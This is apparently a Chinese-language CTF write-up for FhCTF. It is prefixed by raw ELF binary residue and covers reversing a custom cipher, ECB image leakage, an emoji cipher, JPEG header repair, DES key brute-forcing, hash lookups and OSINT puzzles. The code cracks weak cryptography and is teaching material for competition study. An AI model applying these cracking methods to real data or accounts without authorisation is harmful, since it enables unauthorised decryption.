                     7                      S    `A            h                      w                      ?    B            ?                      Scrt1.o __abi_tag crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.0 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry decrypt.cpp _ZNSt8__detail30__integer_to_chars_is_unsignedIjEE _ZNSt8__detail30__integer_to_chars_is_unsignedImEE _ZNSt8__detail30__integer_to_chars_is_unsignedIyEE __FRAME_END__ __GNU_EH_FRAME_HDR _DYNAMIC _GLOBAL_OFFSET_TABLE_ _ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_ _edata _IO_stdin_used __cxa_finalize@GLIBC_2.2.5 strlen@GLIBC_2.2.5 main _ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GLIBCXX_3.4 __dso_handle _Z13removeNewlinePc _fini __libc_start_main@GLIBC_2.34 _Z11rotateRighthi _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@GLIBCXX_3.4 fclose@GLIBC_2.2.5 _ZNSolsEPFRSoS_E@GLIBCXX_3.4 _Z10getNextKeyRj __stack_chk_fail@GLIBC_2.4 _init __TMC_END__ fopen@GLIBC_2.2.5 fputc@GLIBC_2.2.5 _ZSt4cout@GLIBCXX_3.4 _Z12generateSeedPKc __data_start _end __bss_start _ZSt21ios_base_library_initv@GLIBCXX_3.4.32 fgets@GLIBC_2.2.5 _ZSt17__istream_extractRSiPcl@GLIBCXX_3.4.29 _ITM_deregisterTMCloneTable _ZSt3cin@GLIBCXX_3.4 __gmon_start__ _ITM_registerTMCloneTable _ZSt4cerr@GLIBCXX_3.4 __isoc23_strtol@GLIBC_2.38  .symtab .strtab .shstrtab .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .plt.sec .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .data .bss .comment                                                                                                                            #              8      8      0                              6              h      h      $                              I              ?      ?                                     W   ?o       ?      ?      8                             a             ?      ?                                 i             ?      ?      /                             q   o       (      (      ,                            ~   ?o       X      X      ?                             ?             ?      ?                                  ?      B       
      
      ?                           ?                                                         ?                           ?                             ?             ?      ?                                   ?             ?      ?      ?                             ?                         ?                             ?                         
                              ?                             c                              ?             d       d       \                              ?             ?      ?      L                             ?             X=      X-                                   ?             `=      `-                                   ?             h=      h-                                   ?             h?      h/      ?                                          @       0                                                @@      0      X              @                    0               0      +                                                   @0      p     
```

 
提供ELF二進位檔decrypt與加密檔案encrypted_flag，需逆向分析解密邏輯並實作Python腳本取得flag 。透過strings與函數符號識別關鍵演算法，包括generateSeed、getNextKey、rotateRight等

- 靜態分析

執行strings decrypt顯示程式讀取input/output檔案，使用fopen、fgets、fputc，並依賴libstdc++與libc符號如__stack_chk_fail、__libc_start_main。符號表揭示核心函數：

- generateSeed：從password生成初始seed，使用seed = seed * 31 + ch的hash方式，模0xFFFFFFFF。
- getNextKey：LCG偽隨機產生器，公式(seed * 0x41C64E6D + 0x3039) & 0x7FFFFFFF，key = seed % 255。
- rotateRight：右旋位移，rotate_right(byte, 3)。
- main：讀取hex字串，對每byte執行旋轉→更新seed→XOR key→seed += 原byte。

ELF片段顯示hex資料"2781ACE7A1534E1231F7B84AD05565FEFB484A86E6ECD5C76686276A57658F79686098C6A5F0593D395543ABFF118410B2F02CF61FA5"與password提示"I_just_afraid_someday_i_will_forget_the_password"。

- 邏輯還原

解密流程為每byte獨立處理：

1. hex解析為byte b。
2. b_rot = rotate_right(b, 3)，即(b >> 3) | (b << 5) & 0xFF。
3. seed = getNextKey(seed)。
4. key = seed % 255。
5. plaintext_byte = b_rot ^ key。
6. seed = (seed + b) & 0xFFFFFFFF（注意加原始b，非旋轉後）。

此與常見流密碼不同，seed更新依賴原始密文，形成依賴鏈

- 解密腳本

```python
hexline = ("2781ACE7A1534E1231F7B84AD05565FEFB484A86E6ECD5C76686276A57658F7"
           "9686098C6A5F0593D395543ABFF118410B2F02CF61FA5")
password = "I_just_afraid_someday_i_will_forget_the_password"

def generate_seed(s: str) -> int:
    seed = 0
    for ch in s.encode():
        seed = (seed * 31 + ch) & 0xFFFFFFFF
    return seed

def get_next_key(seed: int) -> int:
    return (seed * 0x41C64E6D + 0x3039) & 0x7FFFFFFF

def rotate_right(byte: int, n: int) -> int:
    return ((byte >> n) | ((byte << (8 - n)) & 0xFF)) & 0xFF

seed = generate_seed(password)
out = bytearray()

for i in range(0, len(hexline), 2):
    b = int(hexline[i:i+2], 16)
    b_rot = rotate_right(b, 3)
    seed = get_next_key(seed)
    key = seed % 255
    out.append(b_rot ^ key)
    seed = (seed + b) & 0xFFFFFFFF

print(out.decode()) 
```
```
FhCTF{Why_not_use_std::string_instead_of_char_arrays?}
```

## Crypto

### 安全的加密

這題展示了為什麼 ECB 加密模式不適合用於圖像資料。

- 加密機制分析
![image](/images/FhCTF/29.webp)

題目使用腳本將 flag 轉換為 BMP 圖檔後，再透過 AES-256-ECB 加密。特別的是，加密金鑰直接從 flag 的十六進位表示取得。由於 OpenSSL 的 `enc` 指令在金鑰長度不足時會自動填充零位元組至 32 bytes，實際加密過程中的金鑰是可預測的。

- 攻擊向量

ECB 最致命的弱點在於相同明文區塊總是產生相同密文區塊。當加密對象是結構化資料（如圖像）時，這個特性會直接暴露資料的空間分布模式。

- 解密步驟

由於圖檔格式為 1000×100 像素的 32-bit BMP，每個像素佔 4 bytes，總共 400,000 bytes。AES 以 16-byte 為單位分塊加密，對應到圖像中就是每 4 個像素為一組。

透過以下步驟重建圖像：

- 讀取加密檔案並按 16-byte 切分成區塊
- 跳過 BMP 標頭佔用的前 138 bytes（約 9 個區塊）
- 將每個加密區塊視為一個顏色單元
- 重新排列成 250×100 的區塊陣列（1000÷4=250）
- 為不同的密文區塊指派不同顏色進行視覺化

由於文字區域和背景區域的像素值不同，加密後會產生截然不同的密文區塊。透過顏色映射，文字的輪廓會清晰呈現，直接讀取即可得到 flag。
```python
import os
from PIL import Image
from collections import Counter

# 設定
ENC_FILE = "flag.enc"
OUTPUT_DIR = "results"
MIN_WIDTH = 200  # 根據經驗或測試調整範圍
MAX_WIDTH = 300

def solve():
    # 1. 讀取加密檔案
    with open(ENC_FILE, 'rb') as f:
        content = f.read()

    # 2. 切分區塊 (AES Block Size = 16 bytes)
    block_size = 16
    blocks = [content[i:i+block_size] for i in range(0, len(content), block_size)]
    
    # 3. 找出背景 (頻率最高的區塊)
    counts = Counter(blocks)
    most_common_block = counts.most_common(1)[0][0]
    
    # 4. 轉換為 0/1 Map (1=背景, 0=文字)
    pixel_map = [1 if b == most_common_block else 0 for b in blocks]
    
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

    # 5. 暴力枚舉寬度並繪圖
    print(f"[*] Generating images from width {MIN_WIDTH} to {MAX_WIDTH}...")
    for width in range(MIN_WIDTH, MAX_WIDTH + 1):
        height = len(pixel_map) // width + 1
        img = Image.new('1', (width, height), 1)
        pixels = img.load()
        
        idx = 0
        try:
            for y in range(height):
                for x in range(width):
                    if idx < len(pixel_map):
                        # 如果不是背景(0)，就畫黑點
                        if pixel_map[idx] == 0:
                            pixels[x, y] = 0 
                        idx += 1
        except:
            pass
            
        img.save(f"{OUTPUT_DIR}/width_{width}.webp")

if __name__ == "__main__":
    solve()

```
![image](/images/FhCTF/30.webp)



我們可以看到是反過來的`FhCTF{3C13_m0d3_1s_z0_S3cur17y_}`
![image](/images/FhCTF/31.webp)
```
FhCTF{3C13_m0d3_1s_z0_S3cur17y_}
```

### Encode By Py 😘
![image](/images/FhCTF/32.webp)

這題的核心是「自製 Emoji 加密」其實只是一個可逆的位移編碼，加上可預測的 key 循環與大量重複樣本，整體安全性非常脆弱。

- 整體流程概覽

    - 程式啟動時會載入一組金鑰字串 `ENC_SECRET`，預設值是 `Hi_S3cL157_xato-net`，然後讀取 `flag.txt` 的內容作為明文。  
    - 主邏輯在 `encrypt_bytes`，逐 byte 處理輸入，將每個 byte 轉成對應的 Emoji，最後寫出到 `flag.enc`。  
    - 編碼時使用固定 base（`BASE = 0x1F600`）和範圍（`RANGE = 0x4E`），所以結果都落在一小段 Emoji codepoint 區間。

- 單一 byte 的 Emoji 編碼

    - 對每個明文字節 `byte`，先計算當前索引 `i` 對應到 key 的位置 `idx`，用 `ENC_SECRET[idx]` 做位移，再搭配 XOR 產生一個偏移量 `enc_shift`。  
    - 真正輸出的值是  
      \[
      enc\_byte = ((byte + (enc\_shift \oplus RANGE)) \bmod RANGE) + BASE
      \]
      如果落在特定保留區間則再減去 `ALTERNATIVE` 做修正，確保最後是合法 UTF-8 Emoji。  
    - 某些特殊 byte（例如換行）不會轉成 Emoji，而是「原樣輸出」，並且用來驅動長度相關的計數變數，影響後面 `idx` 的計算。

- 索引循環與行為分析

    - key 的使用位置不是單純 `i % len(ENC_SECRET)`，而是 `i % ((len_num * len_times) if len_num > 0 else 1)`，其中 `len_num`、`len_times` 只在碰到特定 byte（實際上就是那個「if byte == 某值就原樣輸出」的條件）時才會更新。  
    - 這代表整個加密過程是「被分段的」：每次遇到那個特殊控制字元（例如換行）就會重設或改變循環長度，導致每一行的 key index pattern 不同。  
    - 檔案裡第一大段重複的 `✅😢🙈😴` 等 emoji，其實就是利用同一個明文字節反覆出現，讓對應的 key 位置重複，成為攻擊者觀察 key 的絕佳樣本。

- 解密邏輯的逆向設計

    - 要還原明文，第一步是把每個 Emoji 轉回 Unicode codepoint，如果是「被挪到替代區段」的，就加回 `ALTERNATIVE`，再減掉 `BASE`，得到原本的「模 RANGE 之前的加密值」。  
    - 接著，用同樣的 key byte 和位移規則，把(enc_byte−BASE)modRANGE
      反推回bytemodRANGE
      因為運算中有 `% RANGE`，所以理論上只能恢復「0..77 的明文模值」，但對這題來說，flag 被映射到一個有限字元集合（ASCII art）中，這樣的資訊已經足夠辨識。  
    - 實作上就是：  
      - 還原出每個位置對應的 `enc_shift`。  
      - 用加密公式反向求解原始 byte 在 `0..77` 的值。  
      - 把這些值映射到一組可視字元表（例如固定順序的 ASCII 字元）上，得到可讀內容。

- 利用重複行恢復金鑰

    - 題目給的第一行是一長串完全規律重複的 emoji pattern，本質上對應同一個明文字元（例如空白或某個固定符號），相當於「已知明文大量重複」。  
    - 對每個重複位置，已知：  
      - 相同明文字節 `byte`。  
      - 對應 emoji 的 codepoint（即 `enc_byte`）。  
      - `BASE` 與 `RANGE` 為常數。  
    - 於是可以直接把方程式中的 `ENC_SECRET[idx]` 反推回來，逐個位置解出 key 的每個 byte，最後得到長度為 12 的 key：  
      `[49, 57, 49, 35, 19, 44, 42, 37, 41, 23, 22, 21]`
      並且確認這組鍵值會在整段密文中週期性重複。  
    - 有了完整 key，即可對每個 emoji 進行上述的逆運算，把整個 `flag.enc` 轉回「mod 78 明文」序列。

- 還原 ASCII art 與 flag

    - 解碼後得到的並不是直接的一行 flag，而是一個由可視字元構成的大型 ASCII art，風格與 FIGlet 輸出的字型一致。  
    - 把還原出的字元陣列依照原始換行配置輸出，就能看到一個大字樣，裡面嵌著形如 `flag{...}` 的內容。  
    - 將這段 ASCII art 轉成圖片或直接在等寬字型終端機中觀看，肉眼就可以辨認出真正的 flag。整個過程只利用：  
      - 演算法可逆性。  
      - 高度重複的已知明文行。  
      - 有限字元集合導致的模空間縮小。這也說明了「Emoji + 位元運算」並不會自動帶來任何額外安全性，只是另一種換皮的古典密碼而已。  

        ``` python
        from pathlib import Path
        from PIL import Image, ImageDraw, ImageFont

        # 常數定義
        BASE = 0x1F600
        RANGE = 0x4E
        ALTERNATIVE = 0x1CEFE
        KEY = [49, 57, 49, 35, 19, 44, 42, 37, 41, 23, 22, 21]

        # 建立數值到字元的映射表
        VAL_TO_CHAR = {
            14: "\\",
            18: "`",
            32: " ",
            33: "!",
            39: "'",
            40: "(",
            41: ")",
            44: ",",
            45: "-",
            46: ".",
            47: "/",
            58: ":",
            60: "<",
        }


        def parse_encrypted_file(file_path):
            """讀取並解析加密的 emoji 文件"""
            raw_data = Path(file_path).read_bytes()
            text = raw_data.decode("utf-8")

            tokens = []
            for char in text:
                if char == "\n":
                    tokens.append(("newline", 10))
                else:
                    codepoint = ord(char)
                    if codepoint < BASE:
                        codepoint += ALTERNATIVE
                    tokens.append(("char", codepoint - BASE))

            return tokens


        def build_index_sequence(tokens):
            """建立索引序列用於解密"""
            line_length = 0
            line_count = 0
            index_list = []

            for i, (token_type, _) in enumerate(tokens):
                idx = i % (line_length * line_count) if line_length > 0 else 0
                index_list.append(idx)

                if token_type == "newline":
                    if line_length == 0:
                        line_length = i + 1
                    line_count += 1

            return index_list


        def decrypt_tokens(tokens, index_list):
            """解密 token 序列"""
            length = len(tokens)
            plaintext_mod = []

            for i, (token_type, value) in enumerate(tokens):
                if token_type == "newline":
                    plaintext_mod.append(10)
                    continue

                key_value = KEY[index_list[i] % len(KEY)]
                shift = (length - i) % 4
                decrypted_value = (value - (key_value << shift)) % RANGE
                plaintext_mod.append(decrypted_value)

            return plaintext_mod


        def convert_to_ascii_art(plaintext_mod):
            """將解密後的數值轉換為 ASCII 藝術字元"""
            ascii_chars = []
            for value in plaintext_mod:
                if value == 10:
                    ascii_chars.append("\n")
                else:
                    ascii_chars.append(VAL_TO_CHAR.get(value, "?"))

            return "".join(ascii_chars)


        def render_ascii_art_to_image(ascii_text, output_path, font_size=16):
            """將 ASCII 藝術渲染成圖片"""
            lines = ascii_text.splitlines()

            # 嘗試載入字體
            try:
                font = ImageFont.truetype("consola.ttf", font_size)
            except Exception:
                try:
                    font = ImageFont.truetype("Courier New.ttf", font_size)
                except Exception:
                    font = ImageFont.load_default()

            # 計算圖片尺寸
            max_line_length = max(len(line) for line in lines) if lines else 0
            char_width = font.getbbox("A")[2]
            line_height = font.getbbox("A")[3] + 2

            image_width = max_line_length * char_width + 10
            image_height = line_height * len(lines) + 10

            # 建立圖片並繪製文字
            img = Image.new("RGB", (image_width, image_height), "white")
            draw = ImageDraw.Draw(img)

            y_position = 5
            for line in lines:
                draw.text((5, y_position), line, fill="black", font=font)
                y_position += line_height

            # 儲存圖片
            img.save(output_path)
            return output_path


        def main():
            """主程式流程"""
            input_file = Path(r"C:\Users\zenge\Downloads\files (6)\flag.enc")
            output_file = Path(r"C:\Users\zenge\Downloads\files (6)\ascii_art.webp")

            # 步驟 1: 解析加密檔案
            print("正在解析加密檔案...")
            tokens = parse_encrypted_file(input_file)

            # 步驟 2: 建立索引序列
            print("正在建立索引序列...")
            index_list = build_index_sequence(tokens)

            # 步驟 3: 解密
            print("正在解密...")
            plaintext_mod = decrypt_tokens(tokens, index_list)

            # 步驟 4: 轉換為 ASCII 藝術
            print("正在轉換為 ASCII 藝術...")
            ascii_art = convert_to_ascii_art(plaintext_mod)

            # 步驟 5: 渲染成圖片
            print("正在渲染圖片...")
            result_path = render_ascii_art_to_image(ascii_art, output_file)

            print(f"完成！圖片已儲存至: {result_path}")
            print("\nASCII 藝術預覽:")
            print(ascii_art[:500] + "..." if len(ascii_art) > 500 else ascii_art)


        if __name__ == "__main__":
            main()
        ```
![image](/images/FhCTF/33.webp)

```
FhCTF{S1mpl3_FL46_We4k_P4ss}
```

### DES Lv.1 - 老船長的寶藏
- Part 1: JPEG 高度修復 (Image Forensics)

    - 題目分析

        **目標檔案**: `treasuremap.webp`  
        **現象**: 圖片底部被截斷，無法看到完整內容  
        **原因**: JPEG 檔案的高度數值在 Hex Header 中被惡意修改，導致瀏覽器只渲染上半部分，底部的關鍵資訊被隱藏[1]

    - 核心原理

        JPEG 檔案格式使用 SOF (Start of Frame) 區塊儲存圖片尺寸資訊 ：

        **SOF 標記**: `FF C0` (Baseline DCT) 或 `FF C2` (Progressive DCT)  
        **結構**: `[FF C0] [長度(2bytes)] [精度(1byte)] [高度(2bytes)] [寬度(2bytes)]`  
        **位元組序**: Big-Endian (大端序)

        當高度被人為改小時，圖片檢視器會忽略超出高度的像素資料，但這些資料仍完整保留在檔案中。只要將高度值恢復或調大，隱藏的內容就會顯示出來

    - 腳本

        A. 讀取與搜尋 SOF 標記

        ```python
        import re
        import struct

        with open("treasuremap.webp", "rb") as f:
            data = bytearray(f.read())

        # 搜尋所有 SOF 標記 (FF C0 或 FF C2)
        matches = [m.start() for m in re.finditer(b'\xff[\xc0\xc2]', data)]
        ```

        此步驟找出所有定義圖片尺寸的 Header 位置。由於 JPEG 可能包含縮圖 (Thumbnail)，因此可能存在多個 SOF 區塊 `

        B. 鎖定主圖片

        ```python
        max_width = 0
        target_idx = -1

        for sof_pos in matches:
            # 跳過標記本身 (2 bytes) 和長度欄位 (2 bytes) 和精度 (1 byte)
            h_idx = sof_pos + 5  # 高度位置
            w_idx = sof_pos + 7  # 寬度位置

            h = struct.unpack(">H", data[h_idx:h_idx+2])[0]
            w = struct.unpack(">H", data[w_idx:w_idx+2])[0]

            if w > max_width:  # 找出寬度最大的區塊
                max_width = w
                target_idx = h_idx
        ```

        `>H` 表示 Big-Endian Unsigned Short，符合 JPEG 規範 。主圖片通常具有最大的寬度尺寸

        C. 修改高度並儲存

        ```python
        new_height = 2000  # 設定為足夠大的高度
        data[target_idx:target_idx+2] = struct.pack(">H", new_height)

        with open("treasuremap_fixed.jpg", "wb") as f:
            f.write(data)
        ```

        成功修復後，開啟圖片即可看到底部隱藏的資訊，包括：
        - `plaintext.enc` 檔案提示
        - 部分 Key 提示：`r5K9`

        ![{6ED9B10C-BFBE-4518-B8C4-EF7B5ABA8D9F}](/images/FhCTF/34.webp)
- Part 2: DES 密鑰爆破 (Cryptography)

    - 題目背景

        **加密演算法**: DES (Data Encryption Standard)  
        **輸入檔案**: `plaintext.enc` (hex 編碼的密文)  
        **已知資訊**:
        - 題目提示："**The Data** 可以幫你加速解密"
        - 地圖右下角紅字：`key 部分：r5K9`

    - 加密模式判斷

        檢查 `plaintext.enc` 特徵：
        1. Hex 字串長度為偶數 → 可轉換為 bytes
        2. 轉換後長度是 8 的倍數 → 符合 DES block size

        由於題目未提供 IV (Initialization Vector)，且這是入門級 CTF 題目，推測使用 **DES-ECB 模式** 。[3]

        **ECB 特性**：
        - 不需要 IV
        - 每個 block 獨立加密/解密
        - 相同明文 block 產生相同密文 block[3]

    - 密鑰結構分析

        DES 密鑰固定為 **8 bytes**。  
        已知前 4 bytes：`r5K9`  
        未知後 4 bytes：需要爆破

        **字元集**: 英文大小寫 + 數字 = 62 個字元  
        **組合數**: 62^4 = 14,776,336 種可能

- 加速策略

    題目提示 "The Data can help you decrypt faster" 意味著：
    - 不需要解密整個檔案
    - 只解密**第一個 block (8 bytes)** 即可驗證密鑰正確性
    - 利用已知明文攻擊 (Known-Plaintext Attack) 的概念

- 解題腳本

    爆破版本

    ```python
    import binascii
    import itertools
    import string
    from Crypto.Cipher import DES

    # 讀取 hex 密文
    with open("plaintext.enc", "rb") as f:
        ct_hex = f.read().strip()
    ct = binascii.unhexlify(ct_hex)

    prefix = b"r5K9"
    charset = (string.ascii_letters + string.digits).encode()
    ct0 = ct[:8]  # 只取第一個 block

    def is_printable(bs: bytes) -> bool:
        return all(32 <= b < 127 or b in (10, 13, 9) for b in bs)

    found = None
    for suf in itertools.product(charset, repeat=4):
        key = prefix + bytes(suf)
        cipher = DES.new(key, DES.MODE_ECB)
        pt0 = cipher.decrypt(ct0)

        if is_printable(pt0) and pt0.startswith(b"Here is"):
            found = key
            print(f"[+] Key found: {key.decode(errors='ignore')}")
            break

    if not found:
        print("[-] Key not found")
        exit()

    # 使用找到的密鑰解密完整檔案
    cipher = DES.new(found, DES.MODE_ECB)
    pt = cipher.decrypt(ct)

    # 移除 PKCS7 padding
    pad = pt[-1]
    if 1 <= pad <= 8 and pt.endswith(bytes([pad]) * pad):
        pt = pt[:-pad]

    with open("plaintext.dec.txt", "wb") as f:
        f.write(pt)
    ```

    **執行結果**:
    ```
    [+] Key found: r5K9zXxv
    ```

    直接解密版本

    若已知完整密鑰，可直接解密：

    ```python
    from Crypto.Cipher import DES
    import binascii

    with open("plaintext.enc", "rb") as f:
        data = binascii.unhexlify(f.read().strip())

    key = b"r5K9zXxv"
    cipher = DES.new(key, DES.MODE_ECB)
    plain = cipher.decrypt(data)

    # 移除 padding
    pad = plain[-1]
    if 1 <= pad <= 8 and plain.endswith(bytes([pad]) * pad):
        plain = plain[:-pad]

    with open("plaintext.dec.txt", "wb") as f:
        f.write(plain)
    ```

    - 結果

    成功解密後的 `plaintext.dec.txt` 內容：

    ```
    Here is your reward for finding the right key:
    FhCTF{D0n7_c0un7_7h3_d4y5_m4k3_7h3_d4y5_c0un7}
    ```
```
FhCTF{D0n7_c0un7_7h3_d4y5_m4k3_7h3_d4y5_c0un7}
```

### DES Lv.2 – 再探老船長的寶藏（Write-up）

- 題目描述與線索整理

    題目提示：

    * 有一份加密資料（`plaintext.enc`）
    * 上一題 key 曾出現 `r5K9zXxv`
    * 圖上還有 `r5K9`、`A.D.1688`
    * 並明確提示 **“The Data.” 可以幫你加速解密**

    目標：解出密文內容，找到 GPS 座標或 Flag。

- 初步分析：密文格式與 DES 特徵

    拿到 `plaintext.enc` 後先做格式判斷：

    * 檔案內容看起來像一長串 **hex 字元**（`0-9a-f`）
    * 因此需先 `bytes.fromhex(...)` 才能得到真正密文 bytes
    * DES block size = 8 bytes，因此密文長度應該是 8 的倍數（用於驗證資料合理性）

    程式中對應處理：

    ```python
    with open("plaintext.enc", "rb") as f:
        ct = bytes.fromhex(f.read().decode("ascii").strip())
    ```

- 攻擊策略：猜 mode/IV + 爆破 key 結構

    DES 題常見陷阱不是只在 key，而是：

    * mode 可能是 ECB / CBC / CFB / OFB…
    * CBC 需要 IV，IV 可能是：

      * 固定值（全 0）
      * 由提示字串（例如 `"The Data"`）提供
      * 直接放在密文前 8 bytes（`IV || CIPHERTEXT`）
    * key 有可能不是你以為的 `r5K9????`，也可能是 `????r5K9`

    因此本解法採用：

    - (A) 同時測多種加密情境（schemes）

        在 `try_dump()` 裡一次測四種最常見組合：

        1. CBC + IV = `"The Data"`
        2. CBC + IV = `00...00`
        3. CBC + IV = `ct[:8]`（常見 `IV||C` 格式）
        4. ECB（不需要 IV）

        ```python
        schemes = [
            ("CBC_IV_TheData", DES.MODE_CBC, b"The Data", ct),
            ("CBC_IV_zeros",   DES.MODE_CBC, b"\x00"*8,  ct),
            ("CBC_IV_prefix",  DES.MODE_CBC, ct[:8],     ct[8:]),
            ("ECB",            DES.MODE_ECB, None,       ct),
        ]
        ```


    - (B) 同時測多種 key 結構（key structures）

        由於圖上有 `r5K9`，上一題完整 key 有 `zXxv`（`r5K9zXxv`），因此假設 key 可能由固定 4 碼 + 可爆 4 碼組成。

        測試兩個 base（可自行擴充）：

        * `base = b"r5K9"`
        * `base = b"zXxv"`

        並對每個 base 測兩種拼法：

        * `base + suf`  → `r5K9????`
        * `suf + base`  → `????r5K9`

        ```python
        bases = [b"r5K9", b"zXxv"]

        keys = [
            base + suf,
            suf + base,
        ]
        ```


- 爆破範圍（charset / keyspace）

    suffix 使用常見可見字元集合：

    * `a-zA-Z0-9` 加上一些常見符號 `_ - ! @ # .`
    * 目的：涵蓋 CTF 常用 key 風格，同時避免一次把 printable 全塞爆造成時間失控

    ```python
    charset = (string.ascii_letters + string.digits + "_-!@#.").encode()
    ```

    爆破 keyspace 約為：

    * charset 長度 ≈ 67
    * suffix 4 碼 → `67^4 ≈ 20,151,121`

- 快速判斷是否解對（避免每把 key 解全文）

    爆破最慢的地方不是「試 key」，而是「每把 key 都解完整密文」。
    因此此解法採用**快速過濾**：

    - (A) 只解前 64 bytes 當 head 做判斷

    ```python
    head = DES.new(key8, mode, iv=iv).decrypt(body[:64])
    ```

    - (B) 判斷 head 是否像答案

    用兩種條件：

    1. **GPS regex 命中**
    2. **可見字元比例高**

    -  GPS regex

        抓常見小數座標格式：

        * `25.0330,121.5654`
        * `-33.86 151.21`

        ```python
        gps_pat = re.compile(rb'[-+]?\d{1,3}\.\d{3,}\s*[, ]\s*[-+]?\d{1,3}\.\d{3,}')
        ```

    - 可見字元比例

        ```python
        def printable_ratio(b: bytes) -> float:
            good = sum(1 for x in b if x in b"\n\r\t" or 32 <= x <= 126)
            return good / len(b)
        ```

        當 `gps_pat.search(head)` 命中或 `printable_ratio(head) > 0.92`，才會解全文。


    - 找 Flag 的方式

        若題目直接把 Flag 放在明文中，程式也會用 regex 搜尋：

        ```python
        flag_pat = re.compile(rb'FhCTF\{[^}]{1,100}\}', re.I)
        ```


-  7. 執行方式（Windows / PowerShell）

    - 安裝套件

    ```powershell
    python -m pip install pycryptodome
    ```

    - 執行

    ```powershell
    python slove.py
    ```


- 8. 等待等待成功輸出判讀(大概很久

當找到候選 key，程式會印出：

* 命中的 key 與 scheme
* head 前 200 bytes
* 若有，印出 GPS / Flag
* 以及 plaintext 前 500 bytes

輸出如下：

```
*] brute forcing key structures...

[+] HIT! key=b'r5K9bB2x'  scheme=CBC_IV_TheData
[+] head: b'b4NKr3W8 Encryption Standard (DES) is a symmetric-key block ciph'
[+] FLAG: b'FhCTF{23.257735309160896_119.66758643893687}'
b'b4NKr3W8 Encryption Standard (DES) is a symmetric-key block cipher that operates on fixed-size blocks of data. DES processes data in 64-bit (8-byte) blocks and uses a 64-bit key, of which 56 bits are effective key material and the remaining 8 bits are used for parity checking. Because DES encrypts only one block at a time, it must be combined with a mode of operation to securely encrypt data longer than a single block.\r\n\r\nOne widely used mode is Cipher Block Chaining (CBC). In DES-CBC mode, each'
```
```
FhCTF{23.257735309160896_119.66758643893687}
```

### 管理員的密碼洋蔥

3個level

1. level 1 給 `md5 hash`，上網工具查解得到 `qwerty`
2. level 2 個 `SHA-1`，但經過通靈，我們可以猜到 `admin` 這個答案
3. level 3 把 `base64` 轉成文字就行，得到 `FsCTF{Happy Day}`

最後就可以拿到flag 
```
FhCTF{CrYpt0_W3b_M4st3r_2025}
```


## OSINT
### Art Work
給了一張圖片:
![image](/images/FhCTF/35.webp)
以圖搜圖我們會發現一個叫做「風之籽」的作品被展出於111.11.04-112.02.05的「2022屏東落山風藝術季」
```
FhCTF{屏東縣_落山風藝術季_1111104-1120205}
```
### Trace the Landmark
給了三張圖片
![photo-1](/images/FhCTF/36.webp)
![photo-2](/images/FhCTF/37.webp)
![photo-3](/images/FhCTF/38.webp)
用第三張來圖片搜尋找到了**Piazza della Rotonda**這個建築
![image](/images/FhCTF/39.webp)
按照題目Hint排好後得到:
```
FhCTF{Piazza_della_Rotonda_00186_Roma_RM_Italy}
```

### 島1
給了這張圖
![land-1](/images/FhCTF/40.webp)
即使被打碼，還是可以大致看出是「新_廟口餐廳」
google搜尋後:
![image](/images/FhCTF/41.webp)
找到餐廳後我就對著菜單和圖中的菜一一窮舉
![37077136260_d855810352_c](/images/FhCTF/42.webp)
最後答案是原圖正中間的那道**炒千佛手**
```
FhCTF{新大廟口活海鮮_炒千佛手}
```


### The FH Gift
一開始會出現 `malware_sample.eml` 點開來會發現:

![image](/images/FhCTF/43.webp)

這個 salary_adjustment.docx 文件實際上不是 Word 文件，而是一個偽裝的 ZIP 壓縮檔 。通過檢查文件的魔術數字（前幾個 bytes），可以看到它以 PK\x03\x04 開頭，這是 ZIP 檔案的特徵標記。

![image](/images/FhCTF/44.webp)

```
FhCTF{M1M3_Typ3s_C4n_B3_D3c3pt1v3}
```

### 工商時間 1
他給了以下圖片:
![exhibition](/images/FhCTF/45.webp)

把他丟到 https://www.metadata2go.com/ ，可以得到以下資料:
![image](/images/FhCTF/46.webp)

然後他的description是一個網站
點進去他會跳出來一個帶你到展覽網站的 按ok就會跳過去


![2026-01-03_14.35.58](/images/FhCTF/47.webp)

可以看到https://github.com/tschool-students/tschool-students.github.io

我們可以知道是「臺北市數位實驗高級中等學校學習分享會」

![image](/images/FhCTF/48.webp)

2026.1.18 9:00 - 16:00~1.19 9:00 - 16:00 轉成 ISO 8601 格式是
`2026-01-18T09:00_2026-01-19T16:00`

```
FhCTF{T-SCHOOL_STUDENTS_EXPO'26_2026-01-18T09:00_2026-01-19T16:00}
```

### 工商時間 2

由 `工商時間 1`，我們可以從活動官網得知活動地點在 `臺北市中山區吉林路110號`

我們把地址丟到Google Maps收尋，並複製座標貼上來:

![截圖 2026-01-05 00.25.06](/images/FhCTF/49.webp)


### Lithium exploration
![SalardeUyuni](/images/FhCTF/50.webp)

丟給AI

國家： 玻利維亞 (Bolivia)
湖泊名稱（鹽沼）： 烏尤尼鹽沼 (Salar de Uyuni)
生產礦物： 鋰 (Lithium)

原本是錯的
但後來改題目後就對了，很奇妙

```
FhCTF{Bolivia_SalardeUyuni_Lithium}
```

### SRL
給了以下圖片
![SRL](/images/FhCTF/51.webp)
我們可以看到右方是大巨蛋後景有國父紀念館和台北101
所以我們可以推斷我們在:
![image](/images/FhCTF/52.webp)

### 島2
```
在清末民初年代，人們對麻瘋病（痲瘋病）所知有限，為了阻絕得病的患者，就把他們送到建功嶼上自生自滅，因此這座島被稱為「痲瘋礁」。患者被隔離在島上後，只能遙望金門本島，無法回家。
``` 
by google AI 搜尋
![image](/images/FhCTF/53.webp)
![image](/images/FhCTF/54.webp)

### 漂亮的圓頂 1

```danger
請通靈
```

![image](/images/FhCTF/55.webp)

### 漂亮的圓頂 2

簡單搜尋 `免費船班 土耳其`，可以讓我們找到土耳其航空的這個頁面:

https://www.turkishairlines.com/zh-tw/flights/fly-different/touristanbul/

![截圖 2026-01-05 00.40.35](/images/FhCTF/56.webp)

看Google Maps，可以發現我們的目的地，就正處於博斯普鲁斯海峽附近，我們可以驗證這是對的方向。

我們有了這些資訊 `T06 18:30-23:00
博斯普魯斯海峽之旅（4 月 1 日至 10 月 31 日期間營運）`

通靈一下格式變成 flag

```
